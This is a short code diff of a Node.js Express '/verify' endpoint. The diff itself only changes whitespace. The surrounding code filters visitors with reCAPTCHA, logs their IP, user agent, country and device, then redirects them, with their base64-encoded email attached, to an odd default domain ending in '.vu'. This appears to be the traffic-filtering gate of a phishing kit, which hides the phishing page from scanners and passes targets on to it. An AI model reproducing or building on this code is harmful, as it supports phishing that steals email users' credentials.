@@ -39,6 +39,7 @@ function detectDeviceType(ua) {
     return 'PC';
 }
 
+
 function isValidRecaptchaHostname(hostname) {
     if (!hostname) return false;
 
@@ -160,6 +161,7 @@ app.post('/verify', async (req, res) => {
         const MIN_SCORE = 0.2;
         const EXPECTED_ACTION = 'homepage';
 
+
         if (!result.success) {
             return res.status(403).json({
                 status: 'error',
@@ -198,7 +200,6 @@ app.post('/verify', async (req, res) => {
         const device = detectDeviceType(ua);
 
         logVisitor(clientIp, ua, country, device);
-
         const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
         const cleanBaseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
         const redirectUrl = cleanBaseUrl + '/$' + encodeURIComponent(cleanB64);
@@ -208,6 +209,7 @@ app.post('/verify', async (req, res) => {
             email: decodedEmail,
             redirectUrl: redirectUrl
         });
+
     } catch (err) {
         console.error('Verification Error:', err);
         return res.status(500).json({ status: 'error', message: 'Server verification processing failed.' });
